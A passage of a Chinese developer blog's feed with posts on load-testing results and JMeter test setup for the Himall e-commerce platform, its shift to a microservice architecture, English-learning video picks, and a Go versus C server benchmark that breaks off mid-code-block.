&lt;tr&gt;
&lt;td&gt;测试对象Himall&lt;/td&gt;
&lt;td&gt;标准集群阿里云部署&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;浏览首页&quot;&gt;&lt;a href=&quot;#浏览首页&quot; class=&quot;headerlink&quot; title=&quot;浏览首页&quot;&gt;&lt;/a&gt;浏览首页&lt;/h4&gt;&lt;p&gt;响应时间:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-13.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;p&gt;事务处理:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-14.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;测试内容&lt;/th&gt;
&lt;th&gt;并发用户数（VU）&lt;/th&gt;
&lt;th&gt;平均响应时间（RT）&lt;/th&gt;
&lt;th&gt;每秒事务数（TPS）&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;首页&lt;/td&gt;
&lt;td&gt;3000&lt;/td&gt;
&lt;td&gt;0.42秒&lt;/td&gt;
&lt;td&gt;3550&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;浏览商品详情页&quot;&gt;&lt;a href=&quot;#浏览商品详情页&quot; class=&quot;headerlink&quot; title=&quot;浏览商品详情页&quot;&gt;&lt;/a&gt;浏览商品详情页&lt;/h4&gt;&lt;p&gt;响应时间:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-15.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;p&gt;事务处理:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-16.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;测试内容&lt;/th&gt;
&lt;th&gt;并发用户数（VU）&lt;/th&gt;
&lt;th&gt;平均响应时间（RT）&lt;/th&gt;
&lt;th&gt;每秒事务数（TPS）&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;商品浏览&lt;/td&gt;
&lt;td&gt;3000&lt;/td&gt;
&lt;td&gt;3.16秒&lt;/td&gt;
&lt;td&gt;660&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;商品搜索&quot;&gt;&lt;a href=&quot;#商品搜索&quot; class=&quot;headerlink&quot; title=&quot;商品搜索&quot;&gt;&lt;/a&gt;商品搜索&lt;/h4&gt;&lt;p&gt;响应时间:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-17.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;p&gt;事务处理:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-18.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;测试内容&lt;/th&gt;
&lt;th&gt;并发用户数（VU）&lt;/th&gt;
&lt;th&gt;平均响应时间（RT）&lt;/th&gt;
&lt;th&gt;每秒事务数（TPS）&lt;/th&gt;
&lt;th&gt;关键字数&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;商品搜索&lt;/td&gt;
&lt;td&gt;3000&lt;/td&gt;
&lt;td&gt;1.125秒&lt;/td&gt;
&lt;td&gt;1534.1&lt;/td&gt;
&lt;td&gt;100&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;用户登陆&quot;&gt;&lt;a href=&quot;#用户登陆&quot; class=&quot;headerlink&quot; title=&quot;用户登陆&quot;&gt;&lt;/a&gt;用户登陆&lt;/h4&gt;&lt;p&gt;响应时间:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-19.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;p&gt;事务处理:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-20.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;测试内容&lt;/th&gt;
&lt;th&gt;并发用户数（VU）&lt;/th&gt;
&lt;th&gt;平均响应时间（RT）&lt;/th&gt;
&lt;th&gt;每秒事务数（TPS）&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;用户登陆&lt;/td&gt;
&lt;td&gt;2000&lt;/td&gt;
&lt;td&gt;4.283秒&lt;/td&gt;
&lt;td&gt;349&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;下单&quot;&gt;&lt;a href=&quot;#下单&quot; class=&quot;headerlink&quot; title=&quot;下单&quot;&gt;&lt;/a&gt;下单&lt;/h4&gt;&lt;p&gt;响应时间:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-21.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;p&gt;事务处理:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-22.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;测试内容&lt;/th&gt;
&lt;th&gt;并发用户数（VU）&lt;/th&gt;
&lt;th&gt;平均响应时间（RT）&lt;/th&gt;
&lt;th&gt;每秒事务数（TPS）&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;下单&lt;/td&gt;
&lt;td&gt;1000&lt;/td&gt;
&lt;td&gt;4.657秒&lt;/td&gt;
&lt;td&gt;189.1&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;下单流程&quot;&gt;&lt;a href=&quot;#下单流程&quot; class=&quot;headerlink&quot; title=&quot;下单流程&quot;&gt;&lt;/a&gt;下单流程&lt;/h4&gt;&lt;p&gt;响应时间:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-23.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;p&gt;事务处理:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-24.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;测试内容&lt;/th&gt;
&lt;th&gt;并发用户数（VU）&lt;/th&gt;
&lt;th&gt;平均响应时间（RT）&lt;/th&gt;
&lt;th&gt;每秒事务数（TPS）&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;购买商品流程&lt;/td&gt;
&lt;td&gt;1000&lt;/td&gt;
&lt;td&gt;15.657秒&lt;/td&gt;
&lt;td&gt;176.8&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;架构设计&quot;&gt;&lt;a href=&quot;#架构设计&quot; class=&quot;headerlink&quot; title=&quot;架构设计&quot;&gt;&lt;/a&gt;架构设计&lt;/h2&gt;&lt;p&gt;集中架构设计出于系统的可扩展性、可维护性以及成本等多方面的因素考虑，逐渐被放弃，转而采用分布式的架构设计。常用分布式架构采用
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Himall架构方案总结</title>
    <link href="http://binyanbin.github.io/2016/06/05/hishop-2/"/>
    <id>http://binyanbin.github.io/2016/06/05/hishop-2/</id>
    <published>2016-06-04T16:00:00.000Z</published>
    <updated>2016-06-15T15:52:46.000Z</updated>
    
    <content type="html">&lt;p&gt;这段时间一直做&lt;a href=&quot;http://www.hishop.com.cn/products/himall/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Himall&lt;/a&gt;的架构优化，也一直思考什么样的架构设计更合适大型商城系统或者是大型业务系统。从早期的集中化架构到现在的分布式架构，中间经历的各种问题，现在做一个总结。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;集中化架构&quot;&gt;&lt;a href=&quot;#集中化架构&quot; class=&quot;headerlink&quot; title=&quot;集中化架构&quot;&gt;&lt;/a&gt;集中化架构&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/img/hishop-7.png&quot; alt=&quot;图&quot;&gt;&lt;br&gt;Himall早期功能比较少，而且业务相对简单。经过一段时间的开发，一个简单的应用诞生了。同时，集中式设计毫无争议的成为了团队的选择。但是，随着几次迭代开发之后，功能越来越多，业务越来越复杂，这种架构的缺点也渐渐地浮出了水面：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;系统的可维护性受到影响，尤其是那些大型应用&lt;br&gt;多人开发的一个复杂的应用系统，团队人数越多,开发人员必然层次不一，规范难统一，系统模块之间的耦合非常重,模块之间太多相互依赖，非常容易出问题。&lt;/li&gt;
&lt;li&gt;团队开发效率低，协调工作非常多&lt;br&gt;任何改动都会牵涉到多个业务模块,不可能所有开发人员能熟习所有模块，需要与其它业务模块开发人员沟通协调。&lt;/li&gt;
&lt;li&gt;负载均衡不能充分发挥作用&lt;br&gt;集中化架构下的应用即使你做负载均衡，服务器的性能会被所有功能平摊。不能实现服务器性能最大化，也不合适针对特定业务进行特别优化。&lt;br&gt;最终，曾经轻量简洁的应用将会变成一代又一代开发者的噩梦。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;分布式架构&quot;&gt;&lt;a href=&quot;#分布式架构&quot; class=&quot;headerlink&quot; title=&quot;分布式架构&quot;&gt;&lt;/a&gt;分布式架构&lt;/h2&gt;&lt;p&gt;Himall必须寻找到一种方式，将轻量并且质量较好的那部分模块保留下来。也就是找到一个可持续发展的架构，并且在许多次功能迭代开发之后依旧能够让开发人员保持高效开发的开发方式。&lt;/p&gt;
&lt;h3 id=&quot;纵向分解&quot;&gt;&lt;a href=&quot;#纵向分解&quot; class=&quot;headerlink&quot; title=&quot;纵向分解&quot;&gt;&lt;/a&gt;纵向分解&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/img/hishop-8.png&quot; alt=&quot;图&quot;&gt;&lt;br&gt;这是一个非常自然而通用的方法，把所有的功能集中到单一的应用中，不如将应用分解成了多个垂直的小模块，它们相互独立，互不影响,独立部署,通过REST请求来传递信息。&lt;/p&gt;
&lt;p&gt;在模块之间共享代码是严令禁止的。当然，在特殊的情况下，如果我们需要分享代码，我们会建公共模块来解决该问题。依就以REST请求来访问代码。如日志功能，配置功能等&lt;/p&gt;
&lt;p&gt;这些模块同样不能共享一个数据库架构，因为这样做会导致模块间的紧密耦合：数据结构的改变会使得一个模块不能够被独立的部署。对于共享数据部分，我们也建立一个公共数据库来解决这个问题，定期或不定期把数据同步到公共数据库中，汇总数据。这个同步工作由Daemon去完成。&lt;/p&gt;
&lt;p&gt;但是一个垂直模块仍旧可能成为一个相对大型的集中化应用。&lt;br&gt;就拿订单来说，订单不仅包括了商品信息，库存验证，会员的积分使用或等及规则，还有商家的各种促销信息，才能算出订单价格，这样订单才可以支付。一个订单模块做下来依就是一个相对大型的集中化应用。因此我们需要继续对垂直模块进行拆分。&lt;/p&gt;
&lt;h3 id=&quot;微服务&quot;&gt;&lt;a href=&quot;#微服务&quot; class=&quot;headerlink&quot; title=&quot;微服务&quot;&gt;&lt;/a&gt;微服务&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/img/hishop-9.jpg&quot; alt=&quot;图&quot;&gt;&lt;br&gt;通过分布式架构继续将模块分解成多个模块。&lt;br&gt;在这种情况下，应用不仅仅被垂直分解，同时还会被水平分解。这种架构中，请求到达应用后，对请求的处理会被分布于多个微服务中，然后每一微服务产生的结果汇总一个响应，发送回请求者。&lt;br&gt;每一个微服务，仅仅集中于一个业务模块中的几个功能,从而达到高内聚低耦合的目的，并且它结构清晰，一个开发者能够很轻松的掌握它。&lt;/p&gt;
&lt;p&gt;一个模块由一个或多个微服务组成,模块之间的调用全由微服务接口完成，每个微服务自带数据存储,可以独立部署。模块可折，微服务可合，这种架构灵活性非常高。&lt;/p&gt;
&lt;h4 id=&quot;微服务负载均衡&quot;&gt;&lt;a href=&quot;#微服务负载均衡&quot; class=&quot;headerlink&quot; title=&quot;微服务负载均衡&quot;&gt;&lt;/a&gt;微服务负载均衡&lt;/h4&gt;&lt;p&gt;由于微服务粒度划分较细，使用负载均衡更能按需扩展那些性能较差的微服务，发挥服务器的最大性能价值。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/hishop-10.jpg&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;p&gt;在负载均衡中，不同实例的服务通常会分时使用同一个数据库，数据库因此成为了系统的瓶颈，这时我们采用性能更高的nosql数据库，如mongodb。不同微服务使用不同数据库并不会对系造成影响。&lt;/p&gt;
&lt;h4 id=&quot;优点&quot;&gt;&lt;a href=&quot;#优点&quot; class=&quot;headerlink&quot; title=&quot;优点&quot;&gt;&lt;/a&gt;优点&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;微服务非常小，微服务不需要重量级框架和过多的设计，代码相对简单。&lt;/li&gt;
&lt;li&gt;他们能够被独立的部署。因此持续交付或者持续部署变得非常的简单。&lt;/li&gt;
&lt;li&gt;开发者能够为每一个服务选择最适合的开发语言和数据库。不用担心对项目产生影响。&lt;/li&gt;
&lt;li&gt;每个微服务可以独立测试，易于找出性能瓶颈。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&quot;需要解决的问题&quot;&gt;&lt;a href=&quot;#需要解决的问题&quot; class=&quot;headerlink&quot; title=&quot;需要解决的问题&quot;&gt;&lt;/a&gt;需要解决的问题&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;因为微服务数据较大，布署难度加大，需要建立一套更方便的部署机制。&lt;/li&gt;
&lt;li&gt;同样需要建立统一的日志管理模块，方便找查问题。&lt;/li&gt;
&lt;li&gt;同样需要统一配置信息管理.&lt;/li&gt;
&lt;li&gt;公共数据的读写问题，如公共缓存，公共数据库。建立一套有效且高性的方案，来解决读写冲突。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;虽然这些只是这段时间的经验总结，Himall也未完成达到我们所期望的状态，但是我们会继续朝这个访问努力。经过1-2年的迭代之后，我们的架构会更加成熟，经验变得更加丰富。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;这段时间一直做&lt;a href=&quot;http://www.hishop.com.cn/products/himall/&quot;&gt;Himall&lt;/a&gt;的架构优化，也一直思考什么样的架构设计更合适大型商城系统或者是大型业务系统。从早期的集中化架构到现在的分布式架构，中间经历的各种问题，现在做一个总结。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>英语入门视频推荐</title>
    <link href="http://binyanbin.github.io/2016/05/14/english-2/"/>
    <id>http://binyanbin.github.io/2016/05/14/english-2/</id>
    <published>2016-05-13T16:00:00.000Z</published>
    <updated>2016-06-15T15:52:46.000Z</updated>
    
    <content type="html">&lt;p&gt;坚持学习英语也有一年多时间，除了在线外教学习，还看一些原版英语课程和英语电视剧，下面我分享2个非常非常非常合适初学者的系列视频’Learn English with Jennifer’和’extro English’。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Learn-English-with-Jennifer&quot;&gt;&lt;a href=&quot;#Learn-English-with-Jennifer&quot; class=&quot;headerlink&quot; title=&quot;Learn English with Jennifer&quot;&gt;&lt;/a&gt;Learn English with Jennifer&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/img/english-1.png&quot; alt=&quot;Learn English with Jennifer&quot;&gt;&lt;br&gt;一个美国英语教师教授一个俄罗斯人英语的教学视频，只有英文字幕，不用看字幕也很容易看懂听懂，非常合适初学者，作为入门视频课程非常合适。&lt;br&gt;&lt;a href=&quot;http://video.1speaking.com/view/index335.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;观看地址&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;extro-English&quot;&gt;&lt;a href=&quot;#extro-English&quot; class=&quot;headerlink&quot; title=&quot;extro English&quot;&gt;&lt;/a&gt;extro English&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/img/english-2.jpg&quot; alt=&quot;extro English&quot;&gt;&lt;br&gt;这是一个搞笑情景剧,描述几个年轻人浪漫而搞笑的生活故事,可以让你从头笑到尾,只有英文字幕,超级易懂,适合初级或中级能力的学习,对于提高口语和听力具有很好的帮助。&lt;br&gt;&lt;a href=&quot;http://video.1speaking.com/view/index418.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;观看地址&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;坚持学习英语也有一年多时间，除了在线外教学习，还看一些原版英语课程和英语电视剧，下面我分享2个非常非常非常合适初学者的系列视频’Learn English with Jennifer’和’extro English’。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>jmeter himall电商抢购业务简单测试</title>
    <link href="http://binyanbin.github.io/2016/05/13/jmeter-2/"/>
    <id>http://binyanbin.github.io/2016/05/13/jmeter-2/</id>
    <published>2016-05-12T16:00:00.000Z</published>
    <updated>2016-06-15T15:52:46.000Z</updated>
    
    <content type="html">&lt;p&gt;Jmeter是一款比较好的测试工具，我以&lt;a href=&quot;http://www.hishop.com.cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hishop&lt;/a&gt;旗下&lt;a href=&quot;http://www.hishop.com.cn/products/himall/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Himall&lt;/a&gt;(多用户商城产品)为例，使用jmeter对电商网站的抢购业务建立一个简单测试方案。&lt;/p&gt;
&lt;h2 id=&quot;himall抢购业务的测试&quot;&gt;&lt;a href=&quot;#himall抢购业务的测试&quot; class=&quot;headerlink&quot; title=&quot;himall抢购业务的测试&quot;&gt;&lt;/a&gt;&lt;a href=&quot;http://www.hishop.com.cn/products/himall/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;himall&lt;/a&gt;抢购业务的测试&lt;/h2&gt;&lt;p&gt;测试要求:模拟1000用户同时登陆himall商城，同时购买固定活动商品库存，全部下单完成之后，去验证结果。&lt;br&gt;整个测试摸拟过程为:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;登陆 &lt;/li&gt;
&lt;li&gt;频刷活动商品页面 &lt;/li&gt;
&lt;li&gt;下单&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;JMeter设置&quot;&gt;&lt;a href=&quot;#JMeter设置&quot; class=&quot;headerlink&quot; title=&quot;JMeter设置&quot;&gt;&lt;/a&gt;JMeter设置&lt;/h2&gt;整个测试的结构如下图&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;/img/jmeter-6.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;线程组:模拟用户的数量&lt;/li&gt;
&lt;li&gt;聚合报告:测试的性能数据&lt;/li&gt;
&lt;li&gt;查看结果树:具体每个请求的详细信息。&lt;/li&gt;
&lt;li&gt;一个事务控件器:定义从登陆到下单的所有http请求&lt;/li&gt;
&lt;li&gt;HttpCookie管理器:登陆的用户信息在Cookie中，你需要它了保持cookie用户信息&lt;/li&gt;
&lt;li&gt;用户定义变量:记录这次测试指定活动的产品ID及库存ID&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;1.设置模拟用户数1000&lt;br&gt;&lt;img src=&quot;/img/jmeter-7.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;p&gt;2.设置商品及库存ID&lt;br&gt;&lt;img src=&quot;/img/jmeter-8.png&quot; alt=&quot;图&quot;&gt;&lt;br&gt;skuid为库存ID,productid为商品ID。此测试只操作单个库存&lt;/p&gt;
&lt;p&gt;3.设置账号数据&lt;br&gt;&lt;img src=&quot;/img/jmeter-9.png&quot; alt=&quot;图&quot;&gt;&lt;br&gt;准备1000个用户名和账号，以.csv保存，用户名与密码以’,’隔开。&lt;/p&gt;
&lt;p&gt;4.设置登陆请求&lt;br&gt;&lt;img src=&quot;/img/jmeter-10.png&quot; alt=&quot;图&quot;&gt;&lt;br&gt;设置登陆请求,ip和端口,路径。请求方法:post。重要的是BodyData的内容,其中包括用户名，密码及验证码。&lt;br&gt;__CSVRead是一个读csv文件数据的方法。&lt;br&gt;第一参数为目录:C:\Users\admin\Desktop\jmeterdata\account.csv这是我本地的账户信息文件路径。&lt;br&gt;第二参数指你要读第几列数据，列数由0开始。&lt;br&gt;checkCode 验证码验证&lt;br&gt;keep 是否保持登陆&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;注意:需要在网站代码中注释掉验证环节才可以测试，否则你无法登陆成功。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;4.设置活动页面刷新请求&lt;br&gt;&lt;img src=&quot;/img/jmeter-11.png&quot; alt=&quot;图&quot;&gt;&lt;br&gt;设置刷新活动页面次数.10次20次你随便设吧&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/jmeter-12.png&quot; alt=&quot;图&quot;&gt;&lt;br&gt;刷活动设置比较简单，就是一个路径，${productid}代表是你自定义的产品ID,couts是购买数量。&lt;/p&gt;
&lt;p&gt;5.设置提交订单请求&lt;br&gt;&lt;img src=&quot;/img/jmeter-13.png&quot; alt=&quot;图&quot;&gt;&lt;br&gt;定单提交页面也是一个路径，这个请求参数相对较多一些，最重要的是设置好库存ID&lt;br&gt;integral:使用积分,没有为0&lt;br&gt;couponIds:红包ID,没有为空&lt;br&gt;skuIds:购买库存ID,${skuid}则是开始配置的库存ID&lt;br&gt;counts:购买数量&lt;br&gt;collpIds:组合购ID，没有为空&lt;br&gt;recieveAddressId:收货地区ID&lt;br&gt;invoiceType:发票类型 0 不要发票 1 增值税发票 2普通发票&lt;br&gt;&amp;amp;invoiceTitle:发票抬头,没有为空&lt;br&gt;invoiceContext:发票内容，没有为空&lt;br&gt;isCashOnDelivery:是否货到付款&lt;/p&gt;
&lt;p&gt;设置完成，你现在可以泡杯茶坐等结果。当然你也可以修改相应相关参数，如摸拟用户数，指定活动页面的刷新次数等，来看看结果会有哪些不同。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;Jmeter是一款比较好的测试工具，我以&lt;a href=&quot;http://www.hishop.com.cn/&quot;&gt;Hishop&lt;/a&gt;旗下&lt;a href=&quot;http://www.hishop.com.cn/products/himall/&quot;&gt;Himall&lt;/a&gt;(多用户商城产品)为例，使用jmeter对电商网站的抢购业务建立一个简单测试方案。&lt;/p&gt;
&lt;h2 id=&quot;himall抢购业务的测试&quot;&gt;&lt;a href=&quot;#himall抢购业务的测试&quot; class=&quot;headerlink&quot; title=&quot;himall抢购业务的测试&quot;&gt;&lt;/a&gt;&lt;a href=&quot;http://www.hishop.com.cn/products/himall/&quot;&gt;himall&lt;/a&gt;抢购业务的测试&lt;/h2&gt;&lt;p&gt;测试要求:模拟1000用户同时登陆himall商城，同时购买固定活动商品库存，全部下单完成之后，去验证结果。&lt;br&gt;整个测试摸拟过程为:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;登陆 &lt;/li&gt;
&lt;li&gt;频刷活动商品页面 &lt;/li&gt;
&lt;li&gt;下单
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>golang是不是后端开发神器</title>
    <link href="http://binyanbin.github.io/2016/05/08/go-1/"/>
    <id>http://binyanbin.github.io/2016/05/08/go-1/</id>
    <published>2016-05-07T16:00:00.000Z</published>
    <updated>2016-06-15T15:52:46.000Z</updated>
    
    <content type="html">&lt;p&gt;周末有人介绍golang很合适后端开发，随即把之前C实现的静态资源下载功能(读取服务器上的静态资源文件内容返回给客户端)改成golang实现。然后对比一下效果。&lt;/p&gt;
&lt;h2 id=&quot;实现对比&quot;&gt;&lt;a href=&quot;#实现对比&quot; class=&quot;headerlink&quot; title=&quot;实现对比&quot;&gt;&lt;/a&gt;实现对比&lt;/h2&gt;&lt;p&gt;同样使用标准库,golang实现代码+注释只需要123行,C实现代码+注释412行，golang代码量只有C的1/3。&lt;/p&gt;
&lt;h2 id=&quot;测试对比&quot;&gt;&lt;a href=&quot;#测试对比&quot; class=&quot;headerlink&quot; title=&quot;测试对比&quot;&gt;&lt;/a&gt;测试对比&lt;/h2&gt;&lt;p&gt;我使用的是jmeter测试，首先测试c实现的服务,分别用100,200,300线程并发，每线程访问10。测试数据如下:&lt;br&gt;&lt;img src=&quot;/img/go-1.png&quot; alt=&quot;c&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/go-2.png&quot; alt=&quot;c&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/go-3.png&quot; alt=&quot;c&quot;&gt;&lt;br&gt;C版实现越测数据越看不下去了，出错率越来越大。接着我测golang实现，我分别用300线程，1000线程和5000线程并发，每线程访问10次。测试数据如下:&lt;br&gt;&lt;img src=&quot;/img/go-4.png&quot; alt=&quot;c&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/go-5.png&quot; alt=&quot;c&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/go-6.png&quot; alt=&quot;c&quot;&gt;&lt;br&gt;除了响应时间延长，其它都比较稳定，出错率全为0.难道这是传说中的后端神器，难道老板再也不用担心网站访问人数太多当机了，难道我也转golang开发。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;golang实现&quot;&gt;&lt;a href=&quot;#golang实现&quot; class=&quot;headerlink&quot; title=&quot;golang实现&quot;&gt;&lt;/a&gt;golang实现&lt;/h2&gt;&lt;figure class=&quot;highlight go&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span 